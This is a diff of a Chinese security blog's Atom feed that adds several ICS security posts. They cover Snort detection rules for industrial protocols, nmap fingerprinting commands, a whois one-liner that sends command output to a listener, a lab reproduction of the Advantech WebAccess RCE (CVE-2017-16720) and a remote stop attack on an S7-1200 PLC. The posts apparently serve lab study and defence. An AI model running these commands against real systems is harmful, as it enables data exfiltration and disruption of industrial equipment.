@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hi-kk.github.io/</id>
     <title>KEYONE</title>
-    <updated>2019-07-23T12:14:27.754Z</updated>
+    <updated>2019-07-24T03:32:03.321Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hi-kk.github.io/"/>
     <link rel="self" href="https://hi-kk.github.io//atom.xml"/>
@@ -271,6 +271,383 @@ if __name__==&quot;__main__&quot;:
 	s.close()
 </code></pre>
 <p><img src="https://hi-kk.github.io//post-images/1563882419533.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：snort-Windows下安装配置及工控协议识别规则编写]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-snort-windows-xia-an-zhuang-pei-zhi-ji-gong-kong-xie-yi-shi-bie-gui-ze-bian-xie-si-lu">
+        </link>
+        <updated>2019-03-29T02:28:37.000Z</updated>
+        <summary type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>先简单介绍windows环境下的snort安装和配置，主要是为了下面写工控协议识别snort规则和验证规则做铺垫。</p>
+<!--more-->
+<h2 id="下载安装">下载安装</h2>
+<p>官网下载：https://www.snort.org/<br>
+<img src="https://hi-kk.github.io//post-images/1563935405913.png" alt=""><br>
+直接默认安装<br>
+<img src="https://hi-kk.github.io//post-images/1563935447915.png" alt=""><br>
+进入安装目录：<code>C:\Snort</code><br>
+<img src="https://hi-kk.github.io//post-images/1563935466767.png" alt=""></p>
+<h2 id="配置文件">配置文件</h2>
+<p>编辑<code>C:\Snort\etc\snort.conf</code> 修改成如下图<br>
+<img src="https://hi-kk.github.io//post-images/1563935483657.png" alt=""></p>
+<pre><code class="language-bash"># Path to your rules files (this can be a relative path)
+# Note for Windows users:  You are advised to make this an absolute path,
+# such as:  c:\snort\rules
+var RULE_PATH c:\snort\rules
+var SO_RULE_PATH c:\snort\so_rules
+var PREPROC_RULE_PATH c:\snort\preproc_rules
+
+# If you are using reputation preprocessor set these
+# Currently there is a bug with relative paths, they are relative to where snort is
+# not relative to snort.conf like the above variables
+# This is completely inconsistent with how other vars work, BUG 89986
+# Set the absolute path appropriately
+var WHITE_LIST_PATH c:\snort\rules
+var BLACK_LIST_PATH c:\snort\rules
+</code></pre>
+<p><img src="https://hi-kk.github.io//post-images/1563935501116.png" alt=""></p>
+<pre><code># path to dynamic preprocessor libraries
+
+dynamicpreprocessor directory c:\snort\lib\snort_dynamicpreprocessor
+
+# path to base preprocessor engine
+
+dynamicengine c:\snort\lib\snort_dynamicengine\sf_engine.dll
+</code></pre>
+<p><img src="https://hi-kk.github.io//post-images/1563935513767.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1563935527636.png" alt=""></p>
+<p>此处安装参考:http://www.cnblogs.com/lasgalen/p/4512755.html</p>
+<h2 id="规则验证">规则验证</h2>
+<p>进入<code>C:\Snort\rules</code>，新建三个文件</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935541107.png" alt=""></p>
+<p>在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
+<pre><code>alert tcp any any -&gt; any 1911 (msg:&quot;IDS: fox-info&quot;; content:&quot;|66 6f 78|&quot;;  sid:1112515; rev:1;)
+</code></pre>
+<p>CMD进入目录<code>C:\Snort\bin</code></p>
+<p>注意：snort只能识别pcap后缀的包文件，用wireshark的pcapng后缀会报错 需要再另存为一下 修改文件格式 不是直接改后缀哦</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935566053.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1563935577435.png" alt=""><br>
+然后运行：</p>
+<pre><code>PS C:\Snort\bin&gt; .\snort.exe  -c c:\snort\etc\snort.conf -l c:\snort\log -r .\fox_info.pcap
+</code></pre>
+<p>没有报错就说明成功运行了，去看看log有没有输出信息</p>
+<p>进入<code>C:\Snort\log</code></p>
+<p><img src="https://hi-kk.github.io//post-images/1563935592124.png" alt=""></p>
+<p><img src="https://hi-kk.github.io//post-images/1563935604411.png" alt=""><br>
+成功按规则进行了信息输出，到此规则验证成功</p>
+<h2 id="pcap规则编写思路">pcap规则编写思路</h2>
+<p>IEC61850-MMS协议</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935624772.png" alt=""></p>
+<p>先用wireshark打开对应的数据包文件，因为wireshark适配了mms协议的解析，所以可以很直观的分辨出哪个数据包对应什么功能</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935642261.png" alt=""></p>
+<p>从上图可知，选中的数据包执行的是<strong>start</strong>操作</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935658744.png" alt=""></p>
+<p>从上图可知，选中的数据包执行的是<strong>stop</strong>操作</p>
+<p>现在，我们把对应的数据包十六进制数据提取出来，做一下对比，就可以很轻松的写出对应的snort规则</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935678185.png" alt=""></p>
+<p>提取出snort规则，在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
+<pre><code>alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-START&quot;; content:&quot;|bf 28 1b|&quot;;  sid:1112727; rev:1;)
+alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-STOP&quot;; content:&quot;|bf 29 19|&quot;;  sid:1112728; rev:1;)
+alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-RESET&quot;; content:&quot;|bf 2b 19|&quot;;  sid:1112729; rev:1;)
+</code></pre>
+<p>尝试验证一下数据包的规则，查看日志：</p>
+<p><img src="https://hi-kk.github.io//post-images/1563935695810.png" alt=""></p>
+<p>可以发现日志里记录了规则命中的输出信息，到此就算规则编写完成了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：工控常见协议识别]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie">
+        </link>
+        <updated>2019-03-13T03:23:08.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
+项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
+项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
+<!-- more -->
+<p><img src="https://hi-kk.github.io//post-images/1563936445292.png" alt=""></p>
+<h2 id="工控常见协议">工控常见协议</h2>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th>通信</th>
+<th>端口</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Siemens S7</td>
+<td>tcp</td>
+<td>102</td>
+</tr>
+<tr>
+<td>Modbus</td>
+<td>tcp</td>
+<td>502</td>
+</tr>
+<tr>
+<td>IEC 60870-5-104</td>
+<td>tcp</td>
+<td>2404</td>
+</tr>
+<tr>
+<td>DNP3</td>
+<td>tcp</td>
+<td>20000</td>
+</tr>
+<tr>
+<td>EtherNet/IP</td>
+<td>udp</td>
+<td>44818</td>
+</tr>
+<tr>
+<td>BACnet</td>
+<td>udp</td>
+<td>47808</td>
+</tr>
+<tr>
+<td>Tridium Niagara Fox</td>
+<td>tcp</td>
+<td>1911</td>
+</tr>
+<tr>
+<td>Crimson V3</td>
+<td>tcp</td>
+<td>789</td>
+</tr>
+<tr>
+<td>OMRON FINS</td>
+<td>tcp</td>
+<td>9600</td>
+</tr>
+<tr>
+<td>PCWorx</td>
+<td>tcp</td>
+<td>1962</td>
+</tr>
+<tr>
+<td>ProConOs</td>
+<td>tcp</td>
+<td>20547</td>
+</tr>
+<tr>
+<td>MELSEC-Q</td>
+<td>tcp</td>
+<td>5007</td>
+</tr>
+</tbody>
+</table>
+<h2 id="工控协议识别">工控协议识别</h2>
+<h3 id="siemens-s7">Siemens S7</h3>
+<pre><code>nmap -sS -Pn -p 102 --script s7-info -iL 123.txt -oX 123.xml
+</code></pre>
+<h3 id="modbus">Modbus</h3>
+<pre><code>nmap -sS -Pn -p 502 --script modicon-info -iL 123.txt -oX 123.xml
+</code></pre>
+<h3 id="iec-60870-5-104">IEC 60870-5-104</h3>
+<pre><code>nmap -Pn -n -d --script iec-identify.nse  --script-args='iec-identify.timeout=500' -p 2404 &lt;host&gt;
+</code></pre>
+<h3 id="dnp3">DNP3</h3>
+<pre><code>nmap --script dnp3-info -p 20000 &lt;host&gt;
+</code></pre>
+<h3 id="ethernetip">EtherNet/IP</h3>
+<pre><code>nmap --script enip-info -sU  -p 44818 &lt;host&gt;
+</code></pre>
+<h3 id="bacnet">BACnet</h3>
+<pre><code>nmap --script bacnet-info -sU -p 47808 &lt;host&gt;
+</code></pre>
+<h3 id="tridium-niagara-fox">Tridium Niagara Fox</h3>
+<pre><code>nmap --script fox-info.nse -p 1911 &lt;host&gt;
+</code></pre>
+<h3 id="crimson-v3">Crimson V3</h3>
+<pre><code>nmap --script cr3-fingerprint -p 789 &lt;host&gt;
+</code></pre>
+<h3 id="omron-fins">OMRON FINS</h3>
+<pre><code>nmap --script omron-info -sU -p 9600 &lt;host&gt;
+nmap --script ormontcp-info -p 9600 &lt;host&gt;
+nmap --script ormonudp-info -sU -p 9600 &lt;host&gt;
+
+</code></pre>
+<h3 id="pcworx">PCWorx</h3>
+<pre><code>nmap --script pcworx-info -p 1962 &lt;host&gt;
+
+</code></pre>
+<h3 id="proconos">ProConOs</h3>
+<pre><code>nmap --script proconos-info -p 20547 &lt;host&gt;
+
+</code></pre>
+<h3 id="melsec-q">MELSEC-Q</h3>
+<pre><code>nmap -script melsecq-discover -sT -p 5007 &lt;host&gt;
+nmap -script melsecq-discover-udp.nse -sU -p 5006 &lt;host&gt;
+
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[分享自己的工控爬虫项目—PySpider-ICS]]></title>
+        <id>https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics</id>
+        <link href="https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics">
+        </link>
+        <updated>2019-03-08T01:05:13.000Z</updated>
+        <summary type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
+<!--more-->
+<p><a href="https://github.com/hi-KK/PySpider-ICS">https://github.com/hi-KK/PySpider-ICS</a><br>
+<img src="https://hi-kk.github.io//post-images/1563937548686.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[渗透技巧：巧用whois外带回显命令执行结果]]></title>
+        <id>https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo</id>
+        <link href="https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo">
+        </link>
+        <updated>2019-03-05T07:10:02.000Z</updated>
+        <summary type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
+<!--more-->
+<p>先看一下<code>whois</code>命令的使用介绍</p>
+<pre><code class="language-bash">root@kali:~# whois -h
+whois: 选项需要一个参数 -- h
+用法： whois 【选项】 …… 对象 …… 
+
+-h HOST, --host HOST    连接到服务器 HOST
+-p PORT, --port PORT    连接到端口 PORT
+-H                      隐藏法律声明 
+      --verbose         解释正在做什么 
+      --help            显示帮助并退出 
+      --version         输出版本信息并退出 
+
+这些标志是由 whois.ript.net 和 RIPE-like 服务器支持的： 
+ -l                     寻找有更少具体匹配的一个级别 
+-L                     寻找所有更少具体匹配的级别 
+-m                   寻找有更加具体匹配的一个级别 
+-M                   寻找有更加具体的匹配的所有级别 
+-c                     寻找包含 mnt-irt 属性的最小匹配 
+-x                     精确匹配 
+-b                     return brief IP address ranges with abuse contact
+-B                     关闭对象过滤（显示 email 地址） 
+-G                    关闭相关联对象的分组 
+-d                     返回 DNS 反解授权对象 
+-i ATTR[,ATTR]...      对特定的属性（ ATTR ）进行逆向查询 
+-T TYPE[,TYPE]...      只寻找 TYPE 的对象 
+-K                      只返回主键 
+-r                      关闭联系信息的递归查询 
+-R                     强制显示域对象的本地副本，即使 
+                         它包含引用 
+-a                     一并搜索所有的数据库镜像 
+-s SOURCE[,SOURCE]...   从 SOURCE 中搜索数据库镜像 
+-g SOURCE:FIRST-LAST   从串行的 FIRST 到 LAST 的 SOURCE 中查找更新 
+-t TYPE                 请求 TYPE 对象的模板 
+-v TYPE                 请求 TYPE 对象的详细模板 
+-q [version|sources|types]   询问制定服务器信息 
+root@kali:~#
+</code></pre>
+<p>仔细点就可以发现<code>whois</code>命令有两个参数可以连接到远程服务器<code>-h</code>和<code>-p</code><br>
+那么我们来尝试下利用<code>whois</code>命令外带回显命令执行结果<br>
+先在kali中监听一个端口用来接收回显结果</p>
+<p><img src="https://hi-kk.github.io//post-images/1563937879120.png" alt=""></p>
+<p>在ubuntu中执行命令</p>
+<pre><code class="language-bash">whois -h 192.168.159.132 -p 555 &quot;`whoami&amp;uname -a`&quot;
+</code></pre>
+<p><em>需要注意：这里使用的是反引号，这样才会在linux的bash环境执行命令，后面的双引号可带可不带</em></p>
+<p>执行后就看到命令的回显结果已经带出到kali中了<br>
+<img src="https://hi-kk.github.io//post-images/1563937905345.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[漏洞实验：CVE-2017-16720-Advantech WebAccess远程命令执行]]></title>
+        <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong</id>
+        <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong">
+        </link>
+        <updated>2019-01-08T05:50:11.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
+<p>CVE-2017-16720</p>
+<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
+通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
+<p>CVE-2017-16720</p>
+<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
+通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
+<!--more-->
+<h2 id="漏洞说明">漏洞说明</h2>
+<blockquote>
+<p>研华WebAccess软件是研华物联网应用平台解决方案的核心，为用户提供一个基于HTML5技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用WebAccess后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。</p>
+</blockquote>
+<blockquote>
+<p>研华WebAccess提供了一个基于HTML5的智能仪表板作为下一代WebAccess的人机界面。其中，小部件功能可以让系统集成商通过分析图表和图形用仪表板编辑器来创建自定义信息页面。在创建仪表板界面之后，最终用户可以通过仪表板查看器来查看数据与以及可以在电脑，Mac，平板电脑和智能手机通过任何浏览器无缝观看体验。</p>
+</blockquote>
+<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
+通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>通过官方渠道，下载存在该漏洞的版本程序<br>
+<a href="">http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe</a></p>
+<p><strong>安装环境：Windows Server 2008 R2 x64</strong><br>
+<img src="https://hi-kk.github.io//post-images/1563938270052.png" alt=""></p>
+<p>安装一律默认NEXT即可，TCP端口也无需自定义，默认程序端口4592<br>
+<img src="https://hi-kk.github.io//post-images/1563938286276.png" alt=""></p>
+<p>安装完成，系统重启，可查看本机开放端口情况<br>
+<img src="https://hi-kk.github.io//post-images/1563938302550.png" alt=""></p>
+<p>可以看到漏洞所利用的端口4592已经正常开放<br>
+现在，我们使用附件中的EXP脚本，对搭载Advantech WebAccess 8.2-2017.08.18程序的服务器进行攻击<br>
+<img src="https://hi-kk.github.io//post-images/1563938320827.png" alt=""></p>
+<p>漏洞攻击成功的话，利用EXP脚本发送系统命令执行指令到服务器上，服务器会执行对应指令，弹出计算器。<br>
+<img src="https://hi-kk.github.io//post-images/1563938333843.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1563938347128.png" alt=""></p>
+<p>可以看到服务器弹出了计算器，证明漏洞利用成功!</p>
+<h2 id="流量分析">流量分析</h2>
+<p>通过对EXP脚本执行过程中，使用Wireshark抓取对应数据流量，来看服务器通信过程<br>
+<img src="https://hi-kk.github.io//post-images/1563938361402.png" alt=""><br>
+<img src="https://hi-kk.github.io//post-images/1563938373889.png" alt=""></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[工控安全：S7-1200 PLC远程启停攻击实验]]></title>
+        <id>https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan</id>
+        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">
+        </link>
+        <updated>2018-12-29T02:20:08.000Z</updated>
+        <content type="html"><![CDATA[<!--more-->
+<h2 id="工具及运行环境">工具及运行环境</h2>
+<pre><code class="language-bash">root@kali:~# git clone https://github.com/dark-lbp/isf/
+root@kali:~# cd isf/
+root@kali:~/isf# python isf.py 
+root@kali:~/isf# pip install -r requirements.txt
+</code></pre>
+<p>安装好所需python模块，运行isf.py无报错<br>
+<img src="https://hi-kk.github.io//post-images/1563938824684.png" alt=""></p>
+<h2 id="网络设置与plc连接">网络设置与PLC连接</h2>
+<p>本次实验所用的PLC设备如下，设备型号为<code>SIMATIC S7-1200</code><br>
+<img src="https://hi-kk.github.io//post-images/1563938844104.png" alt=""></p>
+<p>将设备接通电源后，此时PLC 指示灯<code>RUN/STOP</code>点亮 绿灯<br>
+<img src="https://hi-kk.github.io//post-images/1563938863112.png" alt=""></p>
+<p>此时使用网线将PLC与主机相连，配置主机网卡IP地址<br>
+<img src="https://hi-kk.github.io//post-images/1563938884154.png" alt=""></p>
+<p>此时我们还不知道PLC设定的IP地址，所以需要对网段进行扫描<br>
+<img src="https://hi-kk.github.io//post-images/1563938898774.png" alt=""></p>
+<p>可以看到：使用nmap扫描出的设备除了本机IP就是<code>PLC</code>设备的IP了，其对应的MAC地址也与设备上的标识一致</p>
+<h2 id="远程攻击演示">远程攻击演示</h2>
+<p>这里我们用的到的攻击模块是<br>
+<code>exploits/plcs/siemens/s7_1200_plc_control</code><br>
+<img src="https://hi-kk.github.io//post-images/1563938919118.png" alt=""></p>
+<p><code>show options查看该模块的配置信息</code><br>
+<code>target: 攻击PLC目标IP地址</code><br>
+<code>port: 攻击PLC目标端口（默认是102端口）</code><br>
+<code>command：攻击指令（0-启动PLC、1-停止PLC、2-重置PLC、3-重置PLC和IP）</code><br>
+<img src="https://hi-kk.github.io//post-images/1563938934709.png" alt=""></p>
+<p>设置好后，输入run指令 开始远程攻击<code>PLC</code><br>
+<img src="https://hi-kk.github.io//post-images/1563938954082.png" alt=""></p>
+<p>此时<code>PLC</code>指示灯 <code>RUN/STOP</code> 变成 黄灯，说明PLC设备已经停止运行，远程攻击成功！</p>
 ]]></content>
     </entry>
     <entry>
